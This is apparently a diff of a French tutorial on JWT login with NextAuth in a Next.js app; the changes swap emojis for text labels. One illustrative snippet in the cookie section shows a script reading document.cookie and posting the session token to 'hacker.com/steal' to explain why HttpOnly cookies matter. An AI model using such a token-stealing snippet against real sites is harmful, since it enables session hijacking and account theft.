@@ -4,7 +4,7 @@ Ce document explique **DE MANIÈRE SIMPLE** comment fonctionne l'authentificatio
 
 ---
 
-## 🎯 L'Objectif
+## L'Objectif
 
 **Créer un système où :**
 1. L'utilisateur s'inscrit
@@ -15,7 +15,7 @@ Ce document explique **DE MANIÈRE SIMPLE** comment fonctionne l'authentificatio
 
 ---
 
-## 🏛️ Analogie : Le Badge d'Entreprise
+## Analogie : Le Badge d'Entreprise
 
 Imaginez une entreprise avec un système de sécurité :
 
@@ -24,7 +24,7 @@ Imaginez une entreprise avec un système de sécurité :
 ```
 Vous : "Bonjour, je veux entrer"
 Gardien : "OK, entrez"
-❌ Problème : N'importe qui peut entrer !
+[X] Problème : N'importe qui peut entrer !
 ```
 
 ### Avec Authentification (Mauvaise Approche)
@@ -42,27 +42,27 @@ Vous : "Bonjour, je veux entrer"
 Gardien : "Quel est votre nom et mot de passe ?"
 Vous : "John, password123"
 Gardien : *Vérifie à nouveau dans son registre*
-❌ Problème : Vous devez vous identifier à CHAQUE fois !
+[X] Problème : Vous devez vous identifier à CHAQUE fois !
 ```
 
-### Avec JWT (Bonne Approche) ✅
+### Avec JWT (Bonne Approche)
 
 ```
-🔷 PREMIÈRE FOIS (Connexion)
+[PREMIÈRE FOIS - Connexion]
 Vous : "Bonjour, je veux entrer"
 Gardien : "Quel est votre nom et mot de passe ?"
 Vous : "John, password123"
 Gardien : *Vérifie dans son registre*
 Gardien : "OK, voici votre BADGE. Il est valide 30 jours."
-         🎫 [BADGE avec votre photo, nom, rôle, expiration]
+         [BADGE avec votre photo, nom, rôle, expiration]
 
-🔷 TOUTES LES FOIS SUIVANTES
+[TOUTES LES FOIS SUIVANTES]
 Vous : "Bonjour, je veux entrer"
 Gardien : *Regarde votre badge*
 Gardien : "Badge valide, entrez !"
-✅ Pas besoin de vérifier le registre à chaque fois !
+[OK] Pas besoin de vérifier le registre à chaque fois !
 
-🔷 DÉCONNEXION
+[DÉCONNEXION]
 Vous : "Je pars, reprenez mon badge"
 Gardien : *Détruit le badge*
 ```
@@ -71,7 +71,7 @@ Gardien : *Détruit le badge*
 
 ---
 
-## 🔑 Les Concepts Clés
+## Les Concepts Clés
 
 ### 1. Access Token vs Refresh Token
 
@@ -85,8 +85,8 @@ Dans Next Match, on utilise **UNIQUEMENT un Access Token (JWT)**.
 | **Refresh Token** | Long (30 jours - 1 an) | Cookie HttpOnly sécurisé | Renouveler l'access token |
 
 **Next Match utilise :**
-- ✅ Un JWT (Access Token) avec durée longue (30 jours)
-- ❌ Pas de Refresh Token
+- [OUI] Un JWT (Access Token) avec durée longue (30 jours)
+- [NON] Pas de Refresh Token
 
 **Pourquoi ?**
 - Simple à implémenter
@@ -150,7 +150,7 @@ HMACSHA256(
 #### Pourquoi C'est Sécurisé ?
 
 ```
-🔷 Scenario 1 : Hacker essaie de modifier le JWT
+[Scenario 1 : Hacker essaie de modifier le JWT]
 
 JWT original :
 eyJhbGci...  .  eyJzdWIi... (role: "MEMBER")  .  SflKxwR...
@@ -160,7 +160,7 @@ eyJhbGci...  .  eyJzdWIi... (role: "ADMIN" !!!)  .  SflKxwR...
 
 Serveur vérifie la signature :
 HMACSHA256(header + payload, NEXTAUTH_SECRET) === signature ?
-❌ FALSE ! Signature ne correspond pas au nouveau payload
+[X] FALSE ! Signature ne correspond pas au nouveau payload
 
 Serveur : "Token invalide, accès refusé !"
 ```
@@ -175,44 +175,44 @@ Serveur : "Token invalide, accès refusé !"
 
 #### Différence Cookie Normal vs HTTP-Only
 
-**🔴 Cookie Normal (Dangereux)**
+**Cookie Normal (Dangereux)**
 
 ```javascript
 // JavaScript peut lire le token
 document.cookie = "token=eyJhbGci...";
 
 // Un script malveillant peut voler le token
-const token = document.cookie; // ❌ Accessible !
+const token = document.cookie; // [X] Accessible !
 fetch('https://hacker.com/steal', { 
   method: 'POST', 
   body: token 
 });
 ```
 
-**🟢 Cookie HTTP-Only (Sécurisé)**
+**Cookie HTTP-Only (Sécurisé)**
 
 ```javascript
 // Créé par le serveur avec flag HttpOnly
 Set-Cookie: next-auth.session-token=eyJhbGci...; HttpOnly; Secure; SameSite=Lax
 
 // JavaScript NE PEUT PAS le lire
-console.log(document.cookie); // ❌ Token invisible !
+console.log(document.cookie); // [X] Token invisible !
 
 // Le browser l'envoie AUTOMATIQUEMENT
-fetch('/api/members'); // ✅ Cookie envoyé automatiquement
+fetch('/api/members'); // [OK] Cookie envoyé automatiquement
 ```
 
 **Avantages :**
-- ✅ Pas accessible par JavaScript (protection XSS)
-- ✅ Envoyé automatiquement à chaque requête
-- ✅ Secure = HTTPS seulement en production
-- ✅ SameSite = Protection CSRF
+- [OK] Pas accessible par JavaScript (protection XSS)
+- [OK] Envoyé automatiquement à chaque requête
+- [OK] Secure = HTTPS seulement en production
+- [OK] SameSite = Protection CSRF
 
 ---
 
-## 📋 Les Étapes Concrètes
+## Les Étapes Concrètes
 
-### 🎬 Scénario Complet : Inscription → Connexion → Utilisation
+### Scénario Complet : Inscription → Connexion → Utilisation
 
 ---
 
@@ -222,7 +222,7 @@ fetch('/api/members'); // ✅ Cookie envoyé automatiquement
 
 ```
 ┌─────────────────────────────────┐
-│  📝 Formulaire d'inscription    │
+│  Formulaire d'inscription       │
 ├─────────────────────────────────┤
 │  Name:     [John Doe        ]   │
 │  Email:    [john@example.com]   │
@@ -239,7 +239,7 @@ fetch('/api/members'); // ✅ Cookie envoyé automatiquement
 #### Ce qui se passe derrière
 
 ```typescript
-// 1️⃣ CLIENT : Collecte les données
+// [1] CLIENT : Collecte les données
 const formData = {
   name: "John Doe",
   email: "john@example.com",
@@ -251,12 +251,12 @@ const formData = {
   description: "Hello!"
 };
 
-// 2️⃣ CLIENT : Appel Server Action
+// [2] CLIENT : Appel Server Action
 const result = await registerUser(formData);
 ```
 
 ```typescript
-// 3️⃣ SERVEUR : Server Action
+// [3] SERVEUR : Server Action
 export async function registerUser(data: RegisterSchema) {
   
   // A. Validation des données
@@ -386,7 +386,7 @@ INSERT INTO "Token" (
 #### Ce que l'utilisateur fait
 
 ```
-📧 Email reçu :
+Email reçu :
 ┌─────────────────────────────────────────┐
 │  Subject: Verify your email address    │
 ├─────────────────────────────────────────┤
@@ -394,7 +394,7 @@ INSERT INTO "Token" (
 │                                         │
 │  Click the link to verify your email:  │
 │                                         │
-│  👉 [Verify Email]                     │
+│  >> [Verify Email]                      │
 │                                         │
 │  Link expires in 24 hours.             │
 └─────────────────────────────────────────┘
@@ -414,10 +414,10 @@ export default async function VerifyEmailPage({ searchParams }) {
   const result = await verifyEmail(token);
   
   if (result.status === 'success') {
-    return <div>✅ Email vérifié ! <Link href="/login">Se connecter</Link></div>;
+    return <div>[OK] Email vérifié ! <Link href="/login">Se connecter</Link></div>;
   }
   
-  return <div>❌ {result.error}</div>;
+  return <div>[ERREUR] {result.error}</div>;
 }
 ```
 
@@ -472,7 +472,7 @@ DELETE FROM "Token" WHERE id = 'clw9k2x0a0002qw8r9p0q1r2s';
 
 ```
 ┌─────────────────────────────────┐
-│  🔐 Login                       │
+│  Login                          │
 ├─────────────────────────────────┤
 │  Email:    [john@example.com]   │
 │  Password: [••••••••••••]       │
@@ -484,7 +484,7 @@ DELETE FROM "Token" WHERE id = 'clw9k2x0a0002qw8r9p0q1r2s';
 #### Ce qui se passe (DÉTAIL COMPLET)
 
 ```typescript
-// 1️⃣ CLIENT : Formulaire
+// [1] CLIENT : Formulaire
 const onSubmit = async (data: LoginSchema) => {
   const result = await signInUser(data);
   
@@ -497,7 +497,7 @@ const onSubmit = async (data: LoginSchema) => {
 ```
 
 ```typescript
-// 2️⃣ SERVEUR : Server Action
+// [2] SERVEUR : Server Action
 export async function signInUser(data: LoginSchema) {
   
   // A. Cherche l'utilisateur
@@ -527,7 +527,7 @@ export async function signInUser(data: LoginSchema) {
     return { status: 'error', error: 'Invalid credentials' };
   }
   
-  // D. 🔥 Connexion via NextAuth
+  // D. Connexion via NextAuth
   const result = await signIn('credentials', {
     email: data.email,
     password: data.password,
@@ -539,7 +539,7 @@ export async function signInUser(data: LoginSchema) {
 ```
 
 ```typescript
-// 3️⃣ NEXTAUTH : Provider Credentials
+// [3] NEXTAUTH : Provider Credentials
 export default {
   providers: [
     Credentials({
@@ -559,7 +559,7 @@ export default {
         const isValid = await compare(password, user.passwordHash);
         if (!isValid) return null;
         
-        // 🔥 RETOURNE L'OBJET USER
+        // RETOURNE L'OBJET USER
         return user;
         // user = {
         //   id: "clw9k2x0a0000qw8r1g2h3j4k",
@@ -575,11 +575,11 @@ export default {
 ```
 
 ```typescript
-// 4️⃣ NEXTAUTH : Callback JWT
+// [4] NEXTAUTH : Callback JWT
 export const { auth, signIn } = NextAuth({
   callbacks: {
     
-    // 🔥 CRÉATION DU JWT
+    // CRÉATION DU JWT
     async jwt({ user, token }) {
       if (user) {
         // Première connexion : user est défini
@@ -612,7 +612,7 @@ export const { auth, signIn } = NextAuth({
 ```
 
 ```typescript
-// 5️⃣ NEXTAUTH : Signature du JWT
+// [5] NEXTAUTH : Signature du JWT
 const jwt = {
   header: { alg: "HS256", typ: "JWT" },
   payload: {
@@ -644,7 +644,7 @@ const jwtString = `${encodedHeader}.${encodedPayload}.${signature}`;
 ```
 
 ```typescript
-// 6️⃣ NEXTAUTH : Création du Cookie
+// [6] NEXTAUTH : Création du Cookie
 res.setHeader('Set-Cookie', [
   `next-auth.session-token=${jwtString}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000`
   // Max-Age=2592000 = 30 jours (30 * 24 * 60 * 60)
@@ -662,8 +662,8 @@ Domain:   localhost
 Path:     /
 Expires:  2024-11-20 10:00:00 (30 jours)
 Size:     423 bytes
-HttpOnly: ✅
-Secure:   ✅ (en production)
+HttpOnly: [OUI]
+Secure:   [OUI] (en production)
 SameSite: Lax
 ```
 
@@ -678,7 +678,7 @@ Utilisateur clique : "Voir les membres"
 ```
 
 ```
-🌐 BROWSER
+[BROWSER]
 │
 ├─ GET /members
 │  Headers:
@@ -686,7 +686,7 @@ Utilisateur clique : "Voir les membres"
 │
 ▼
 
-⚡ NEXT.JS SERVER - MIDDLEWARE
+[NEXT.JS SERVER - MIDDLEWARE]
 │
 ├─ Lit le cookie
 │  const cookie = req.cookies.get('next-auth.session-token')
@@ -713,7 +713,7 @@ Utilisateur clique : "Voir les membres"
 │
 ▼
 
-📄 PAGE /members
+[PAGE /members]
 │
 ├─ const session = await auth()
 │  // session disponible immédiatement (pas de query DB)
@@ -722,7 +722,7 @@ Utilisateur clique : "Voir les membres"
 │
 ▼
 
-🌐 BROWSER
+[BROWSER]
 └─ Page affichée
 ```
 
@@ -731,7 +731,7 @@ Utilisateur clique : "Voir les membres"
 ```typescript
 // src/middleware.ts
 export default auth((req) => {
-  // 🔥 req.auth est AUTOMATIQUEMENT défini par NextAuth
+  // req.auth est AUTOMATIQUEMENT défini par NextAuth
   // En lisant et décodant le JWT depuis le cookie
   
   const isLoggedIn = !!req.auth;
@@ -760,7 +760,7 @@ import { auth } from '@/auth';
 
 export default async function MembersPage() {
   
-  // 🔥 Lit le JWT depuis le cookie
+  // Lit le JWT depuis le cookie
   const session = await auth();
   
   // session = {
@@ -774,7 +774,7 @@ export default async function MembersPage() {
   //   expires: "2024-11-20T10:00:00.000Z"
   // }
   
-  // ❌ AUCUNE REQUÊTE EN BASE DE DONNÉES
+  // [IMPORTANT] AUCUNE REQUÊTE EN BASE DE DONNÉES
   // Tout est dans le JWT !
   
   return (
@@ -821,11 +821,11 @@ export default function LogoutButton() {
 
 ---
 
-## 🎓 Comment Reproduire Ça ?
+## Comment Reproduire Ça ?
 
 ### Les Étapes pour Créer Votre Système
 
-#### 1️⃣ **Setup Base de Données (Prisma)**
+#### Étape 1 : Setup Base de Données (Prisma)
 
 ```bash
 # Installation
@@ -874,7 +874,7 @@ npx prisma db push
 
 ---
 
-#### 2️⃣ **Installation NextAuth**
+#### Étape 2 : Installation NextAuth
 
 ```bash
 npm install next-auth@beta
@@ -885,7 +885,7 @@ npm install @types/bcryptjs -D
 
 ---
 
-#### 3️⃣ **Configuration NextAuth**
+#### Étape 3 : Configuration NextAuth
 
 **Fichier `.env` :**
 
@@ -985,7 +985,7 @@ export const { GET, POST } = handlers
 
 ---
 
-#### 4️⃣ **Middleware de Protection**
+#### Étape 4 : Middleware de Protection
 
 **Fichier `src/middleware.ts` :**
 
@@ -1016,7 +1016,7 @@ export const config = {
 
 ---
 
-#### 5️⃣ **Server Actions**
+#### Étape 5 : Server Actions
 
 **Fichier `src/app/actions/authActions.ts` :**
 
@@ -1085,7 +1085,7 @@ export async function signOutUser() {
 
 ---
 
-#### 6️⃣ **Composants Client**
+#### Étape 6 : Composants Client
 
 **Fichier `src/app/login/page.tsx` :**
 
@@ -1136,7 +1136,7 @@ export default function LoginPage() {
 
 ---
 
-#### 7️⃣ **Accès Session dans les Pages**
+#### Étape 7 : Accès Session dans les Pages
 
 **Server Component :**
 
@@ -1178,46 +1178,46 @@ export default function ProfileCard() {
 
 ---
 
-## 📊 Schéma Récapitulatif
+## Schéma Récapitulatif
 
 ```mermaid
 flowchart TD
-    START([👤 Utilisateur]) --> REGISTER{Déjà inscrit?}
+    START([Utilisateur]) --> REGISTER{Déjà inscrit?}
     
-    REGISTER -->|Non| R1[📝 Formulaire inscription]
+    REGISTER -->|Non| R1[Formulaire inscription]
     R1 --> R2[Server Action: registerUser]
     R2 --> R3[Hash password avec bcrypt]
     R3 --> R4[INSERT User en DB]
     R4 --> R5[Génère token vérification]
-    R5 --> R6[📧 Envoi email]
+    R5 --> R6[Envoi email]
     R6 --> R7[Utilisateur clique lien]
     R7 --> R8[UPDATE User.emailVerified]
     R8 --> LOGIN
     
-    REGISTER -->|Oui| LOGIN[🔐 Page Login]
+    REGISTER -->|Oui| LOGIN[Page Login]
     
     LOGIN --> L1[Formulaire email + password]
     L1 --> L2[Server Action: signInUser]
     L2 --> L3{Credentials valides?}
     
-    L3 -->|Non| L4[❌ Erreur]
+    L3 -->|Non| L4[Erreur]
     L4 --> LOGIN
     
     L3 -->|Oui| L5[NextAuth Provider authorize]
     L5 --> L6[Callback jwt: Crée token]
-    L6 --> L7[🔑 Génère JWT]
+    L6 --> L7[Génère JWT]
     L7 --> L8[Signature avec NEXTAUTH_SECRET]
-    L8 --> L9[🍪 Cookie HTTP-Only créé]
-    L9 --> L10[✅ Redirection /dashboard]
+    L8 --> L9[Cookie HTTP-Only créé]
+    L9 --> L10[Redirection /dashboard]
     
-    L10 --> USE[🏠 Navigation dans l'app]
+    L10 --> USE[Navigation dans l'app]
     
     USE --> U1[Requête GET /page]
     U1 --> U2[Cookie JWT envoyé automatiquement]
     U2 --> U3[Middleware décode JWT]
     U3 --> U4{JWT valide?}
     
-    U4 -->|Non| U5[❌ Redirect /login]
+    U4 -->|Non| U5[Redirect /login]
     U5 --> LOGIN
     
     U4 -->|Oui| U6[req.auth défini]
@@ -1227,7 +1227,7 @@ flowchart TD
     USE --> LOGOUT{Déconnexion?}
     LOGOUT -->|Non| USE
     LOGOUT -->|Oui| LO1[signOut]
-    LO1 --> LO2[🗑️ Cookie supprimé]
+    LO1 --> LO2[Cookie supprimé]
     LO2 --> LO3[Redirect /]
     LO3 --> START
     
@@ -1241,7 +1241,7 @@ flowchart TD
 
 ---
 
-## ✅ Checklist Complète
+## Checklist Complète
 
 ### Pour Reproduire le Système
 
@@ -1285,7 +1285,7 @@ flowchart TD
 
 ---
 
-## 🎯 Points Clés à Retenir
+## Points Clés à Retenir
 
 1. **JWT = Badge numérique**
    - Contient les infos user
@@ -1314,7 +1314,7 @@ flowchart TD
 
 ---
 
-## 📚 Ressources pour Approfondir
+## Ressources pour Approfondir
 
 **Documentation :**
 - NextAuth.js : https://authjs.dev/
@@ -1331,5 +1331,5 @@ flowchart TD
 
 ---
 
-**Vous savez maintenant EXACTEMENT comment fonctionne l'authentification moderne ! 🎓**
+**Vous savez maintenant EXACTEMENT comment fonctionne l'authentification moderne !**
 
